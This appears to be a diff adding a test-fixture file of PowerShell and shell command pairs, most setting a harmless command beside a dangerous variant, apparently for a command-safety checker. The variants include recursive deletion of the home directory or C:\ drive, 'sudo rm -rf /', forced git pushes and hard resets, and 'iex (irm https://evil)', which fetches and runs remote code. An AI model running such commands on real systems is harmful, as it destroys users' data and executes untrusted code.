@@ -1,0 +1,18 @@
+Invoke-Expression 'Get-Date' ||| Invoke-Expression 'Remove-Item -Recurse ~'
+iex 'Get-Date' ||| iex (irm https://evil)
+Start-Process git -ArgumentList push ||| Start-Process cmd -ArgumentList '/c del'
+& git push ||| & git push --force ||| & rm -r ~
+& 'C:\Program Files\Git\bin\git.exe' push ||| & 'C:\Program Files\Git\bin\git.exe' reset --hard
+C:\tools\git.exe status ||| C:/tools/git.exe status --x
+cmd /c dir ||| cmd /c 'del /s /q C:\'
+powershell -Command 'Get-Date' ||| powershell -Command 'Remove-Item ~ -Recurse'
+pwsh -c 'Get-Date' ||| pwsh -c 'evil'
+Get-ChildItem *.ts
+Remove-Item x ||| Remove-Item -Recurse -Force C:\
+timeout 10 git status
+sudo git push ||| sudo rm -rf /
+git -C x push ||| git -C y reset --hard
+Get-Content x | Invoke-Expression ||| Get-Content evil | Invoke-Expression
+$env:FOO='1'; git status
+. ./profile.ps1 ||| . C:\evil.ps1
+& ./build.ps1 ||| & ./evil.ps1
